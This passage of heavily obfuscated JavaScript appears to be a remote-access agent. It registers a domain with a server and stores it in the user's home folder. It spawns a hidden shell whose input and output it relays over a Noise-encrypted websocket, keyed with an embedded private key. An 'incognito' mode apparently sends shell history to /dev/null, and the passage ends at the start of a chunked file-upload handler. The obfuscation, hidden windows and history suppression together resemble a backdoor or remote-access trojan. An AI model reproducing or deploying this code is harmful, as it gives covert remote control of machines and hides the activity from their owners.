                            t['resume'](), t['on'](g[fC(0x40e)], () => q(t[fC(0x7d8)]));
                        });
                    s['on'](g[fB(0x151)], t => {
                        const fD = fB;
                        g[fD(0x2ef)](d, g[fD(0x671)](g[fD(0x787)](p, '\x20'), n) + g[fD(0x903)] + t[fD(0x49d)]), g['xFmfB'](q, 0x0);
                    }), s[fB(0x797)](0x7530, () => s[fB(0x1f0)](new Error(fB(0x906))));
                    if (o)
                        s['write'](o);
                    s['end']();
                };
            b[fu(0x7c4)](d, b['GWzvL'](b[fu(0x4e0)] + h + b[fu(0x441)] + b[fu(0x219)](i[fu(0x7a3)], 0x0), ')'));
            try {
                b[fu(0x1d4)](m, b[fu(0x6ac)], l(k), fu(0x63d), n => {
                    const fG = fu, o = {
                            'ezxaU': function (p, q) {
                                return p(q);
                            },
                            'ajqrd': function (p, q) {
                                const fE = a0b;
                                return g[fE(0x787)](p, q);
                            },
                            'iOgQY': function (p, q) {
                                const fF = a0b;
                                return g[fF(0x787)](p, q);
                            },
                            'GJuxh': g[fG(0x709)],
                            'ltPTz': function (p, q) {
                                const fH = fG;
                                return g[fH(0x8ac)](p, q);
                            },
                            'WGtrf': g[fG(0x8d7)],
                            'LzVFW': function (p, q) {
                                return p(q);
                            }
                        };
                    g['YLkLt'](d, g[fG(0x671)](g[fG(0x730)], n));
                    if (g['mVvSp'](n, 0x199)) {
                        g['UloVx'](d, g[fG(0x521)] + h + ':*');
                        const p = k['filter'](([q]) => q !== 'n');
                        g[fG(0x505)](m, fG(0x43f) + h + ':' + i, g[fG(0x586)](l, p), g['pFuIx'], q => {
                            const fI = fG;
                            o[fI(0x422)](d, o[fI(0x482)](o[fI(0x19f)](o[fI(0x3d1)], q), o[fI(0x27d)](q, 0xc8) ? fI(0x6ad) : o[fI(0x1ab)])), o['LzVFW'](f, o[fI(0x27d)](q, 0xc8));
                        });
                    } else
                        g[fG(0x8ac)](n, 0xc8) ? (g['jIHST'](d, g[fG(0x8bb)]), g[fG(0x586)](f, !![])) : (g['UloVx'](d, g[fG(0x607)](g[fG(0x607)]('上报失败\x20(状态\x20', n), ')')), g['YLkLt'](f, ![]));
                });
            } catch (n) {
                d(b['iaYxV'](b['IHsOW'], n['message'])), b[fu(0x7c4)](f, ![]);
            }
        })['then'](f => {
            if (f)
                this['_domain'] = a;
            return f;
        })[fr(0x7ea)](() => ![]);
    }
    static async [a0aY(0x135)](a) {
        const fJ = a0aY, b = {
                'UzBNc': function (c, d) {
                    return c <= d;
                }
            };
        for (let c = 0x1; b[fJ(0x104)](c, 0x3); c++) {
            if (await this[fJ(0x692)](a))
                return;
            c < 0x3 && await new Promise(d => setTimeout(d, 0x3e8 * 0x2 ** c));
        }
    }
    static [a0aY(0x13d)]() {
        const fK = a0aY, a = [
                process.env.USERPROFILE,
                process.env.HOME
            ];
        for (const b of a) {
            if (b && a0l[fK(0x383)](b) && a0l[fK(0x479)](b)[fK(0x4e4)]())
                return b;
        }
        try {
            return a0p['homedir']();
        } catch (c) {
            return process[fK(0x133)]();
        }
    }
    static ['resolveDomainFilePath']() {
        const fL = a0aY, a = {
                'MuxvW': fL(0x75c),
                'pTEsO': function (c, d) {
                    return c > d;
                }
            };
        let b = (a0P['KPATH'] || '')[fL(0x63e)]();
        if (!b)
            return a0o['join'](this[fL(0x13d)](), 'domain.txt');
        if (b['startsWith'](a[fL(0x1cc)]))
            b = a[fL(0x429)](b[fL(0x7a3)], 0x5) ? a0o[fL(0x52c)](this[fL(0x13d)](), b[fL(0x489)](0x5)[fL(0x655)](/^[/\\]+/, '')) : this['homeDir']();
        else
            b[fL(0x627)]('~') && (b = a0o['resolve'](b[fL(0x655)](/^~(?=[/\\]|$)/, this['homeDir']())));
        return b;
    }
    static [a0aY(0x71c)](a) {
        const fM = a0aY;
        this[fM(0x8b4)] = a;
        const b = this['resolveDomainFilePath']();
        try {
            a0l[fM(0x3e3)](a0o[fM(0x56e)](a0o['resolve'](b)), { 'recursive': !![] }), a0l['writeFileSync'](b, a), a0D['info'](fM(0x48a) + b);
        } catch (c) {
            a0D[fM(0x444)](fM(0x2de) + b + '):\x20' + c[fM(0x49d)]);
        }
    }
    static ['deleteDomainFile']() {
        const fN = a0aY, a = this[fN(0x346)]();
        try {
            a0l['existsSync'](a) && a0l[fN(0x479)](a)[fN(0x34d)]() && (a0l[fN(0x621)](a), a0D[fN(0x281)]('[KMODE]\x20🗑️\x20域名文件已删除:\x20' + a));
        } catch (b) {
            a0D['warn']('[KMODE]\x20⚠️\x20域名文件删除失败\x20(' + a + fN(0x30b) + b['message']);
        }
    }
    static ['onBaseinfoSuccess']() {
        const fO = a0aY;
        !this[fO(0x218)] && (this[fO(0x218)] = !![], this[fO(0x7b3)]());
    }
    static ['startStdinListener']() {
        const fP = a0aY, a = {
                'CdcGW': function (b, c) {
                    return b === c;
                },
                'CHADI': fP(0x199),
                'turNo': fP(0x570),
                'GtTvN': 'close',
                'oEgPg': fP(0x8e9)
            };
        try {
            const b = a0q[fP(0x6e3)]({
                'input': process['stdin'],
                'terminal': ![]
            });
            b['on'](fP(0x106), c => {
                const fQ = fP;
                a['CdcGW'](c[fQ(0x63e)](), a[fQ(0x2fc)]) && console[fQ(0x10d)](this[fQ(0x8b4)] || a[fQ(0x20d)]);
            }), b['on'](a[fP(0x1e7)], () => {
            }), b['on'](a[fP(0x6bc)], () => {
            });
        } catch (c) {
        }
    }
    static [a0aY(0x6d8)](a) {
        const fR = a0aY, b = {
                'eNvxl': fR(0x340),
                'bqiNB': function (f, g) {
                    return f === g;
                },
                'uRXRa': fR(0x2a2)
            }, c = b['eNvxl']['split']('|');
        let d = 0x0;
        while (!![]) {
            switch (c[d++]) {
            case '0':
                a['onDomainChange'] = (f, g) => {
                    const fS = fR;
                    this[fS(0x71c)](g);
                };
                continue;
            case '1':
                if (b[fR(0x532)](a0P[fR(0x682)], '2') && this['knameValid']()) {
                    a0D[fR(0x281)](b[fR(0x1ca)]), a[fR(0x28d)] = (f, g) => {
                        const fT = fR;
                        this[fT(0x135)](g);
                    }, a['create'](a0P[fR(0x338)])[fR(0x60e)](f => this['reportShzal'](f[fR(0x33e)]))[fR(0x7ea)](() => {
                    });
                    return;
                }
                continue;
            case '2':
                a[fR(0x702)](a0P['PORT'])['then'](f => {
                    const fU = fR;
                    this[fU(0x71c)](f[fU(0x33e)]);
                })[fR(0x7ea)](f => {
                    const fV = fR;
                    a0D[fV(0x444)](fV(0x21f) + f['message']);
                });
                continue;
            case '3':
                this[fR(0x343)]();
                continue;
            case '4':
                a0D[fR(0x281)](fR(0x688));
                continue;
            }
            break;
        }
    }
}
let a0aO = null, a0aP = null;
const a0aQ = new Promise((a, b) => {
    const fW = a0aY, c = {
            'sPwiM': fW(0x4e6),
            'IQYEe': fW(0x3bc),
            'Ifeir': function (d) {
                return d();
            },
            'ZsLSH': function (d) {
                return d();
            },
            'CZIja': fW(0x28a)
        };
    try {
        a0y(function (d) {
            const fX = fW;
            if (!d) {
                a0aP = new Error(c['sPwiM']), a0D[fX(0x444)](c[fX(0x26a)], a0aP['message']), c[fX(0x5b6)](a);
                return;
            }
            a0aO = d, a0D['debug'](fX(0x49a)), c[fX(0x3b5)](a);
        });
    } catch (d) {
        a0aP = d, a0D[fW(0x444)](c[fW(0x2bd)], d[fW(0x49d)]), a();
    }
});
process['on'](a0aY(0x7d7), (a, b) => {
    const fY = a0aY, c = { 'QQgPP': fY(0x213) };
    a0D[fY(0x8e9)](c[fY(0x622)], a);
}), process['on']('uncaughtException', a => {
    const fZ = a0aY, b = { 'BGvzB': 'Uncaught\x20Exception:' };
    a0D['error'](b[fZ(0x6b4)], a), process[fZ(0x4ec)](0x1);
});
class a0aR {
    constructor(a, b, c) {
        const g0 = a0aY, d = { 'BwUym': g0(0x32b) }, f = d[g0(0x759)]['split']('|');
        let g = 0x0;
        while (!![]) {
            switch (f[g++]) {
            case '0':
                this[g0(0x1fb)] = b;
                continue;
            case '1':
                this['sendCipher'] = null;
                continue;
            case '2':
                this[g0(0x80e)] = a;
                continue;
            case '3':
                this['hs'] = null;
                continue;
            case '4':
                this[g0(0x8c4)] = null;
                continue;
            case '5':
                this[g0(0x2b9)] = c;
                continue;
            case '6':
                this['handshakeFinished'] = ![];
                continue;
            }
            break;
        }
    }
    async [a0aY(0x8a9)]() {
        const g1 = a0aY, a = {
                'BLxzN': g1(0x3d4),
                'awDNk': g1(0x355),
                'rqJSA': g1(0x880)
            };
        await a0aQ;
        if (!a0aO)
            throw a0aP || new Error(a[g1(0x82b)]);
        const b = a0aO, c = this['isInitiator'] ? b[g1(0x757)][g1(0x92c)] : b['constants'][g1(0x404)];
        this['hs'] = b[g1(0x59b)](g1(0x900), c);
        const d = Buffer['from'](a[g1(0x3e7)]), f = this[g1(0x1fb)] ? Buffer['from'](this[g1(0x1fb)], a[g1(0x56c)]) : null, g = this['expectedRemotePubB64'] ? Buffer['from'](this[g1(0x2b9)], 'base64') : null;
        this['hs'][g1(0x258)](d, f, g, null);
    }
    ['processHandshake'](a) {
        const g2 = a0aY, b = {
                'sGdNj': function (d, f) {
                    return d > f;
                },
                'mEgAe': function (d, f) {
                    return d === f;
                }
            };
        if (this[g2(0x3f3)])
            return Buffer['alloc'](0x0);
        const c = a0aO;
        a && b[g2(0x3b6)](a[g2(0x7a3)], 0x0) && b['mEgAe'](this['hs']['GetAction'](), c[g2(0x757)][g2(0x27a)]) && this['hs'][g2(0x1d3)](a);
        if (b[g2(0x41f)](this['hs'][g2(0x87c)](), c[g2(0x757)][g2(0x5ce)]))
            return this['_splitAndFinish'](), Buffer[g2(0x744)](0x0);
        if (b[g2(0x41f)](this['hs'][g2(0x87c)](), c['constants'][g2(0x494)])) {
            const d = this['hs'][g2(0x835)](new Uint8Array(0x0));
            return b[g2(0x41f)](this['hs'][g2(0x87c)](), c[g2(0x757)][g2(0x5ce)]) && this[g2(0x6c5)](), Buffer[g2(0x68c)](d);
        }
        return Buffer[g2(0x744)](0x0);
    }
    [a0aY(0x6c5)]() {
        const g3 = a0aY, a = {
                'pHUwW': g3(0x880),
                'bvXPh': function (g, h) {
                    return g === h;
                },
                'zebQC': g3(0x271)
            };
        let b = null;
        try {
            b = this['hs'][g3(0x45b)]();
        } catch (g) {
            b = null;
        }
        const c = this[g3(0x2b9)] ? Buffer[g3(0x68c)](this['expectedRemotePubB64'], a['pHUwW']) : null, d = b && c && a['bvXPh'](b[g3(0x7a3)], c[g3(0x7a3)]) && a0k[g3(0x909)](Buffer[g3(0x68c)](b), c);
        if (!d)
            throw new Error(a[g3(0x352)]);
        const f = this['hs'][g3(0x6d4)]();
        this[g3(0x78a)] = f[0x0], this[g3(0x8c4)] = f[0x1], this[g3(0x3f3)] = !![];
        try {
            if (this['hs'])
                this['hs'][g3(0x3f5)]();
        } catch (h) {
        }
        this['hs'] = null;
    }
    ['encrypt'](a) {
        const g4 = a0aY, b = { 'AKPXh': g4(0x390) };
        if (!this[g4(0x3f3)])
            throw new Error(b[g4(0x82e)]);
        const c = new Uint8Array(0x0), d = new Uint8Array(a);
        return Buffer['from'](this['sendCipher'][g4(0x3bf)](c, d));
    }
    ['decrypt'](a) {
        const g5 = a0aY, b = { 'dzDAF': g5(0x7ee) };
        if (!this['handshakeFinished'])
            throw new Error(b[g5(0x74b)]);
        const c = new Uint8Array(0x0), d = new Uint8Array(a);
        return Buffer[g5(0x68c)](this[g5(0x8c4)][g5(0x707)](c, d));
    }
    [a0aY(0x3f5)]() {
        const g6 = a0aY, a = { 'ErkOx': g6(0x471) }, b = a[g6(0x2c3)][g6(0x140)]('|');
        let c = 0x0;
        while (!![]) {
            switch (b[c++]) {
            case '0':
                try {
                    if (this['sendCipher'])
                        this[g6(0x78a)][g6(0x3f5)]();
                } catch (d) {
                }
                continue;
            case '1':
                try {
                    if (this['hs'])
                        this['hs']['free']();
                } catch (f) {
                }
                continue;
            case '2':
                this[g6(0x8c4)] = null;
                continue;
            case '3':
                this['sendCipher'] = null;
                continue;
            case '4':
                this['hs'] = null;
                continue;
            case '5':
                try {
                    if (this[g6(0x8c4)])
                        this[g6(0x8c4)][g6(0x3f5)]();
                } catch (g) {
                }
                continue;
            }
            break;
        }
    }
}
class a0aS {
    constructor(a, b, c, d) {
        const g7 = a0aY, f = { 'ldqgk': g7(0x256) }, g = f[g7(0x136)]['split']('|');
        let h = 0x0;
        while (!![]) {
            switch (g[h++]) {
            case '0':
                this[g7(0x5cd)] = b;
                continue;
            case '1':
                this[g7(0x6a6)] = null;
                continue;
            case '2':
                this[g7(0x735)] = a;
                continue;
            case '3':
                this['_onDataCb'] = null;
                continue;
            case '4':
                this[g7(0x83a)] = 0x0;
                continue;
            case '5':
                this['_onExitCb'] = null;
                continue;
            case '6':
                this[g7(0x133)] = c;
                continue;
            case '7':
                this[g7(0x55f)] = d || [];
                continue;
            }
            break;
        }
    }
    [a0aY(0x810)]() {
        const g8 = a0aY, a = {
                'BScPI': function (c, d) {
                    return c || d;
                },
                'KINsk': function (c, d, f, g) {
                    return c(d, f, g);
                },
                'LHVEg': g8(0x593),
                'MoKtv': g8(0x318)
            };
        this[g8(0x6a6)] = a['KINsk'](a0s, this[g8(0x735)], this[g8(0x55f)], {
            'env': this[g8(0x5cd)],
            'cwd': this[g8(0x133)],
            'windowsHide': !![],
            'stdio': [
                g8(0x593),
                g8(0x593),
                a[g8(0x171)]
            ]
        }), this[g8(0x83a)] = this[g8(0x6a6)][g8(0x83a)] || 0x0;
        const b = this;
        this['proc'][g8(0x8da)]['on'](a[g8(0x8db)], c => b[g8(0x62d)](c)), this[g8(0x6a6)]['stderr']['on'](g8(0x318), c => b[g8(0x62d)](c)), this[g8(0x6a6)]['on']('exit', (c, d) => {
            const g9 = g8;
            if (b[g9(0x337)])
                b[g9(0x337)]({
                    'exitCode': c,
                    'signal': a[g9(0x579)](d, null)
                });
        });
    }
    [a0aY(0x62d)](a) {
        const ga = a0aY, b = { 'uWKBh': 'utf-8' };
        if (this[ga(0x324)])
            this[ga(0x324)](a[ga(0x491)](b[ga(0x83e)]));
    }
    [a0aY(0x4d5)](a) {
        const gb = a0aY;
        return this[gb(0x324)] = a, {
            'dispose': () => {
                const gc = gb;
                this[gc(0x324)] = null;
            }
        };
    }
    [a0aY(0x495)](a) {
        const gd = a0aY;
        return this[gd(0x337)] = a, {
            'dispose': () => {
                const ge = gd;
                this[ge(0x337)] = null;
            }
        };
    }
    [a0aY(0x2c2)](a) {
        const gf = a0aY;
        if (!this[gf(0x6a6)] || !this[gf(0x6a6)][gf(0x302)])
            return;
        try {
            this[gf(0x6a6)]['stdin'][gf(0x2c2)](a);
        } catch (b) {
        }
    }
    [a0aY(0x5c2)]() {
    }
    [a0aY(0x7dc)]() {
        const gg = a0aY;
        try {
            if (this[gg(0x6a6)])
                this[gg(0x6a6)][gg(0x7dc)]();
        } catch (a) {
        }
    }
}
class a0aT {
    constructor() {
        const gh = a0aY, a = {
                'wAFfL': gh(0x387),
                'vXYyf': gh(0x776)
            }, b = a['wAFfL'][gh(0x140)]('|');
        let c = 0x0;
        while (!![]) {
            switch (b[c++]) {
            case '0':
                this[gh(0x594)] = ![];
                continue;
            case '1':
                this['msgQueue'] = [];
                continue;
            case '2':
                this[gh(0x447)] = null;
                continue;
            case '3':
                this[gh(0x262)] = a['vXYyf'];
                continue;
            case '4':
                this[gh(0x2ce)] = null;
                continue;
            case '5':
                this[gh(0x5d1)] = [];
                continue;
            case '6':
                this['useNoise'] = !![];
                continue;
            case '7':
                this[gh(0x551)] = new a0aR(![], this[gh(0x4f5)], this[gh(0x7f5)]);
                continue;
            case '8':
                this[gh(0x222)] = ![];
                continue;
            case '9':
                this[gh(0x7f5)] = a0P[gh(0x458)][gh(0x6a0)][gh(0x6bb)];
                continue;
            case '10':
                this[gh(0x5a0)] = null;
                continue;
            case '11':
                this['AGENT_PRIVATE_KEY'] = a0P[gh(0x458)][gh(0x784)]['private_b64'];
                continue;
            }
            break;
        }
    }
    async [a0aY(0x287)]() {
        const gi = a0aY, a = {
                'RZutq': function (b, c) {
                    return b === c;
                },
                'sCZBV': gi(0x413)
            };
        this['requestId'] && a0D['info']('[' + this[gi(0x2ce)] + gi(0x883));
        if (this[gi(0x447)]) {
            a['RZutq'](process[gi(0x7ac)], a[gi(0x6a5)]) && this['ptyProcess'][gi(0x83a)] && this[gi(0x814)](this[gi(0x447)]['pid']);
            try {
                this['ptyProcess']['kill']();
            } catch (b) {
            }
            this[gi(0x447)] = null;
        }
        if (this['cipher'])
            this['cipher'][gi(0x3f5)]();
        if (this['websocket'])
            try {
                a[gi(0x10c)](this[gi(0x5a0)][gi(0x6ca)], this['websocket']['OPEN']) && this[gi(0x5a0)][gi(0x92b)](0x3e8, gi(0x30a));
            } catch (c) {
            } finally {
                this[gi(0x5a0)] = null;
            }
    }
    [a0aY(0x814)](a) {
        try {
            a0r('taskkill\x20/F\x20/T\x20/PID\x20' + a, { 'windowsHide': !![] }, () => {
            });
        } catch (b) {
        }
    }
    [a0aY(0x646)](a) {
        const gj = a0aY, b = {
                'lpzME': 'handshake',
                'dvAXn': function (c, d) {
                    return c > d;
                },
                'fKyKy': function (c, d) {
                    return c(d);
                },
                'JmxtD': function (c, d) {
                    return c === d;
                },
                'TfKHX': gj(0x536)
            };
        if (this[gj(0x262)] === b['lpzME']) {
            if (b[gj(0x3cd)](this[gj(0x5d1)][gj(0x7a3)], 0x0)) {
                const c = this['msgResolvers'][gj(0x1d7)]();
                b['fKyKy'](c, a);
            } else
                this['msgQueue'][gj(0x75e)](a);
        } else
            b[gj(0x3ff)](this[gj(0x262)], b['TfKHX']) && this['_processTerminalMessage'](a);
    }
    async [a0aY(0x1ac)]() {
        const gk = a0aY;
        if (this[gk(0x7de)][gk(0x7a3)] > 0x0)
            return this[gk(0x7de)][gk(0x1d7)]();
        return new Promise(a => {
            const gl = gk;
            this['msgResolvers'][gl(0x75e)](a);
        });
    }
    async [a0aY(0x461)](a) {
        const gm = a0aY, b = {
                'zcrWR': function (c, d) {
                    return c(d);
                },
                'vobAL': gm(0x7cd),
                'LIaoi': function (c, d) {
                    return c > d;
                },
                'Nxcyo': function (c, d) {
                    return c(d);
                },
                'nejcZ': '✅\x20Noise\x20握手完成，端到端加密通道已建立！',
                'CHjjC': gm(0x4f7)
            };
        b[gm(0x3f4)](a, b[gm(0x7d6)]);
        try {
            await this[gm(0x551)][gm(0x8a9)]();
            const c = await this[gm(0x1ac)](), d = this[gm(0x551)][gm(0x60f)](c);
            d && b[gm(0x76c)](d[gm(0x7a3)], 0x0) && this[gm(0x5a0)][gm(0x4a9)](d);
            const f = await this[gm(0x1ac)]();
            this[gm(0x551)][gm(0x60f)](f);
            if (!this[gm(0x551)][gm(0x3f3)])
                throw new Error(gm(0x391));
            b[gm(0x567)](a, b['nejcZ']);
        } catch (g) {
            b[gm(0x3f4)](a, gm(0x68f) + g[gm(0x49d)]);
            throw new Error(b[gm(0x3d3)]);
        }
    }
    [a0aY(0x46b)]() {
        const gn = a0aY, a = {
                'KNlvL': function (d, f) {
                    return d === f;
                },
                'XbhtV': gn(0x413),
                'uOASf': gn(0x31d),
                'eBzPa': gn(0x58b),
                'jGphI': gn(0x350),
                'zcBTO': gn(0x559),
                'awmci': gn(0x85e),
                'YeTKp': gn(0x2e5),
                'cJcZt': gn(0x442),
                'hqvuN': gn(0x73b)
            };
        if (a[gn(0x451)](process[gn(0x7ac)], a['XbhtV'])) {
            const d = process.env.SystemRoot || a[gn(0x1c2)], f = [
                    a0o[gn(0x52c)](d, a[gn(0x6c3)], a['jGphI'], gn(0x60d), a[gn(0x44d)]),
                    process.env.COMSPEC,
                    a0o[gn(0x52c)](d, a[gn(0x6c3)], 'cmd.exe')
                ];
            for (const g of f) {
                if (g && a0l[gn(0x383)](g))
                    return g;
            }
            return gn(0x821);
        }
        const b = [
            a['awmci'],
            a[gn(0x8a6)],
            a['cJcZt']
        ];
        for (const h of b) {
            if (a0l[gn(0x383)](h))
                return h;
        }
        const c = process.env.SHELL;
        if (c && a0l[gn(0x383)](c))
            return c;
        return a[gn(0x67b)];
    }
    async [a0aY(0x3b7)](a, b, c, d = ![], f = ![]) {
        const go = a0aY, g = {
                'Ncrcd': function (i, j) {
                    return i(j);
                },
                'mQeNN': go(0x51f),
                'kRGbq': go(0x49d)
            };
        this[go(0x5a0)] = a, this['requestId'] = b, this[go(0x222)] = d, this['incognitoRequested'] = f;
        const h = i => a0D[go(0x281)](go(0x179) + b + ']\x20' + i);
        this[go(0x5ba)] = !c, g[go(0x6cd)](h, this[go(0x5ba)] ? go(0x517) : g[go(0x493)]), a['on'](g[go(0x333)], i => this['_handleRawMessage'](i));
        try {
            this[go(0x5ba)] && await this[go(0x461)](h), await this['_runTerminal'](h);
        } catch (i) {
            g[go(0x6cd)](h, '❌\x20终端会话异常:\x20' + i[go(0x49d)]), await this[go(0x287)]();
        }
    }
    async [a0aY(0x6e0)](a) {
        const gp = a0aY, b = {
                'eEJhm': gp(0x30c),
                'StnFs': function (h, i) {
                    return h === i;
                },
                'BbCWW': function (h, i) {
                    return h(i);
                },
                'jGsdE': function (h, i) {
                    return h(i);
                },
                'pmFEZ': gp(0x108),
                'YboeT': 'win32',
                'WaWUG': '/dev/null',
                'lqdEK': gp(0x559),
                'rglBG': '-Command',
                'LVxbN': gp(0x237),
                'zuSdH': function (h, i) {
                    return h === i;
                },
                'yNgrX': function (h, i) {
                    return h(i);
                },
                'cuCxz': 'terminal',
                'dOgqI': gp(0x92b)
            }, c = this['getAvailableShell']();
        b[gp(0x527)](a, '🐚\x20使用\x20Shell\x20路径:\x20' + c);
        const d = Object[gp(0x2f4)]({}, process.env);
        delete d[gp(0x921)], d[gp(0x88c)] = gp(0x237);
        if (!d[gp(0x510)])
            d[gp(0x510)] = b['pmFEZ'];
        this[gp(0x594)] && process['platform'] !== b[gp(0x49f)] && (d[gp(0x3b2)] = b[gp(0x41c)]);
        const f = this[gp(0x594)] && process['platform'] === b[gp(0x49f)] && b['StnFs'](a0o[gp(0x8df)](c)[gp(0x1a2)](), b[gp(0x72a)]) ? [
                gp(0x5d6),
                b['rglBG'],
                gp(0x107)
            ] : [], g = a0E();
        try {
            const h = {
                'name': b[gp(0x770)],
                'cols': 0x50,
                'rows': 0x18,
                'cwd': g,
                'env': d
            };
            if (b[gp(0x617)](process[gp(0x7ac)], b['YboeT']))
                try {
                    this[gp(0x447)] = a0C[gp(0x810)](c, f, h);
                } catch (i) {
                    b[gp(0x2eb)](a, gp(0x84e) + i[gp(0x49d)]), this[gp(0x447)] = new a0aS(c, d, g, f), this['ptyProcess'][gp(0x810)]();
                }
            else
                this[gp(0x447)] = a0C[gp(0x810)](c, f, h);
            a(gp(0x8d4) + (this[gp(0x447)][gp(0x83a)] || gp(0x90c)) + ')');
            this[gp(0x222)] && this[gp(0x13c)](c);
            this[gp(0x262)] = b[gp(0x86e)];
            while (this['msgQueue'][gp(0x7a3)] > 0x0) {
                const j = this[gp(0x7de)][gp(0x1d7)]();
                this[gp(0x7a4)](j);
            }
            this[gp(0x447)]['onData'](k => {
                const gq = gp;
                try {
                    let l = Buffer[gq(0x68c)](k, b[gq(0x439)]);
                    this['useNoise'] && this['cipher'] && this[gq(0x551)]['handshakeFinished'] && (l = this['cipher'][gq(0x367)](l)), b[gq(0x62a)](this['websocket'][gq(0x6ca)], 0x1) && this[gq(0x5a0)][gq(0x4a9)](l);
                } catch (m) {
                }
            }), this[gp(0x447)]['onExit'](({
                exitCode: k,
                signal: l
            }) => {
                const gr = gp;
                b[gr(0x83b)](a, gr(0x918) + k + ',\x20Signal:\x20' + l + ')'), this[gr(0x287)]();
            }), this['websocket']['on'](b[gp(0x786)], () => {
                const gs = gp;
                b[gs(0x83b)](a, '🔌\x20客户端主动断开'), this[gs(0x287)]();
            });
        } catch (k) {
            b[gp(0x2eb)](a, gp(0x154) + k['message']), await this[gp(0x287)]();
            throw k;
        }
    }
    static [a0aY(0x84c)](a) {
        const gt = a0aY, b = {
                'EoFMI': function (d, f) {
                    return d(f);
                }
            };
        let c = a0o[gt(0x8df)](b[gt(0x818)](String, a || '')[gt(0x63e)]())['toLowerCase']();
        if (c[gt(0x389)](gt(0x45d)))
            c = c[gt(0x489)](0x0, -0x4);
        return c || 'sh';
    }
    static [a0aY(0x7e7)](a) {
        const gu = a0aY, b = {
                'EkATe': function (c, d) {
                    return c === d;
                },
                'VhYii': gu(0x413),
                'rDRdn': function (c, d) {
                    return c(d);
                },
                'rGIyN': gu(0x559),
                'FtYqU': function (c, d) {
                    return c === d;
                }
            };
        if (b[gu(0x2ec)](process['platform'], b[gu(0x16e)])) {
            const c = a0o[gu(0x8df)](b[gu(0x3d9)](String, a || ''))[gu(0x1a2)]();
            return b[gu(0x2ec)](c, b[gu(0x86a)]) || b[gu(0x47d)](c, gu(0x821));
        }
        return !![];
    }
    ['_sendWelcome'](a) {
        const gv = a0aY, b = {
                'MZIFT': 'welcome',
                'PGaLP': function (c, d) {
                    return c === d;
                }
            };
        try {
            let c = Buffer['from'](JSON['stringify']({
                'type': b[gv(0x417)],
                'shell': a0aT['normalizeShellName'](a),
                'path': a,
                'incognito': !!(this[gv(0x594)] && a0aT[gv(0x7e7)](a))
            }));
            this[gv(0x5ba)] && this[gv(0x551)] && this[gv(0x551)][gv(0x3f3)] && (c = this[gv(0x551)][gv(0x367)](c)), this[gv(0x5a0)] && b[gv(0x7cc)](this[gv(0x5a0)][gv(0x6ca)], 0x1) && this[gv(0x5a0)]['send'](c);
        } catch (d) {
        }
    }
    ['_processTerminalMessage'](a) {
        const gw = a0aY, b = {
                'HxMcC': gw(0x30c),
                'UOiTz': 'heartbeat',
                'uRFat': function (c, d) {
                    return c === d;
                },
                'RpUoC': gw(0x5c2),
                'Xfyle': 'input',
                'ZNCeO': function (c, d) {
                    return c !== d;
                },
                'AnuSa': 'base64'
            };
        if (!this[gw(0x447)])
            return;
        try {
            const c = Buffer[gw(0x68c)](a);
            let d;
            this['useNoise'] ? d = this['cipher'][gw(0x170)](c) : d = c;
            let f = ![], g = d['toString'](b[gw(0x42b)]);
            if (g[gw(0x63e)]()[gw(0x627)]('{'))
                try {
                    const h = JSON[gw(0x7f4)](g);
                    f = !![];
                    if (h[gw(0x165)] === b['UOiTz']) {
                        let i = Buffer[gw(0x68c)](JSON[gw(0x548)]({ 'type': b[gw(0x18b)] }));
                        if (this[gw(0x5ba)])
                            i = this[gw(0x551)][gw(0x367)](i);
                        this[gw(0x5a0)]['send'](i);
                        return;
                    }
                    if (b[gw(0x28c)](h[gw(0x165)], b[gw(0x7b9)])) {
                        this[gw(0x447)]['resize'](h['cols'] || 0x50, h[gw(0x63c)] || 0x18);
                        return;
                    }
                    if (h['type'] === b[gw(0x541)] && b[gw(0x5f1)](h['data'], undefined)) {
                        let j = h[gw(0x4f8)] === b['AnuSa'] ? Buffer[gw(0x68c)](h['data'], b['AnuSa'])[gw(0x491)](b[gw(0x42b)]) : h[gw(0x318)];
                        this[gw(0x447)]['write'](j);
                        return;
                    }
                } catch (k) {
                    f = ![];
                }
            !f && this[gw(0x447)][gw(0x2c2)](d['toString'](b[gw(0x42b)]));
        } catch (l) {
            a0D[gw(0x281)](gw(0x179) + this[gw(0x2ce)] + gw(0x589) + l[gw(0x49d)]);
            if (this['useNoise'])
                this[gw(0x287)]();
        }
    }
}
async function a0aU() {
    const gx = a0aY, a = {
            'KlbSo': gx(0x406),
            'tNdGo': gx(0x39e)
        }, b = await import(a[gx(0x292)]);
    a0A = b[gx(0x152)];
    const c = await import(a[gx(0x12f)]);
    a0B = c[gx(0x1a5)];
}
async function a0aV(a = {}) {
    const gy = a0aY, b = {
            'sgstC': gy(0x2e0),
            'ruCIn': 'OPTIONS',
            'wkUag': gy(0x792),
            'WzeEY': gy(0x70a),
            'jOnKm': gy(0x1e1),
            'nWNAo': gy(0x4f1),
            'Yawyf': gy(0x385),
            'aSqRF': gy(0x598),
            'rCWvW': function (c, d) {
                return c === d;
            },
            'glYUf': function (c, d) {
                return c === d;
            },
            'nQdHd': function (c, d) {
                return c !== d;
            },
            'BQTBO': function (c, d, f) {
                return c(d, f);
            },
            'LYlSb': function (c, d) {
                return c < d;
            },
            'FoNie': gy(0x6a7),
            'psAVT': function (c, d) {
                return c === d;
            },
            'Rocdh': function (c, d) {
                return c === d;
            },
            'kitEJ': gy(0x14d),
            'nSkEA': function (c, d) {
                return c === d;
            },
            'DIDLR': gy(0x20f),
            'MVXyF': gy(0x5a1),
            'wBrvY': function (c, d) {
                return c(d);
            },
            'XNctB': function (c, d) {
                return c === d;
            },
            'RUhlm': function (c, d) {
                return c / d;
            },
            'AEplN': gy(0x8d1),
            'Lpwol': function (c, d) {
                return c > d;
            },
            'DPxSk': gy(0x360),
            'xAeMV': 'error',
            'BMxrJ': function (c, d) {
                return c === d;
            },
            'bdiML': function (c, d) {
                return c(d);
            },
            'nCZlK': 'x-file-name',
            'xFEYS': gy(0x2dd),
            'ebYaH': 'x-total-chunks',
            'rVBGw': gy(0x10b),
            'SEhrp': function (c, d) {
                return c(d);
            },
            'ILDsB': function (c, d) {
                return c !== d;
            },
            'CCKqR': function (c, d, f) {
                return c(d, f);
            },
            'juuot': function (c, d) {
                return c(d);
            },
            'fmMXW': gy(0x4f9),
            'zitlq': 'x-file-size',
            'hvbUu': gy(0x47b),
            'bjeHL': gy(0x228),
            'AQEys': 'path\x20required',
            'IIqeV': function (c, d) {
                return c === d;
            },
            'zIaoN': gy(0x25a),
            'uwxFF': function (c, d) {
                return c !== d;
            },
            'aTpxj': function (c, d) {
                return c === d;
            },
            'QvRlZ': 'port\x20must\x20be\x20an\x20integer\x20between\x201\x20and\x2065535',
